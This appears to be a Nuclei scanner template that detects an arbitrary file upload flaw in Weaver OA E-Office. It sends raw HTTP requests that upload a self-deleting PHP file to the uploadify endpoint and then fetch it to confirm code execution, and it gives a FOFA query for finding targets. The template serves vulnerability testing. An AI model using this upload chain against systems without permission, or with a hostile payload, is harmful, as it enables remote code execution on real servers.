http:
- extractors:
  - internal: true
    name: attachmentID
    regex:
    - '[0-9]{10}'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - status_code_3 == 200 && contains(body_3,'{{string}}')
    type: dsl
  matchers-condition: and
  raw:
  - 'GET /inc/jquery/uploadify/uploadify.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /inc/jquery/uploadify/uploadify.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/71.0.3578.98 Safari/537.36

    Accept: */*

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye

    Accept-Encoding: gzip


    ------WebKitFormBoundaryjetvpuye

    Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"

    Content-Type: application/octet-stream


    <?php echo "{{string}}";unlink(__FILE__);?>

    ------WebKitFormBoundaryjetvpuye--

    '
  - 'GET /attachment/{{attachmentID}}/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: weaver-jquery-file-upload
info:
  author: SleepingBag945
  classification:
    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
  description: Arbitrary File Upload in OA E-Office jQuery.
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-EOffice\""
    max-request: 3
    product: e-office
    vendor: weaver
    verified: true
  name: OA E-Office jQuery - Arbitrary File Upload
  reference:
  - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
  severity: critical
  tags: weaver,e-office,oa,instrusive,rce,intrusive,vuln
variables:
  filename: '{{to_lower(rand_base(5))}}'
  string: '{{randstr}}'
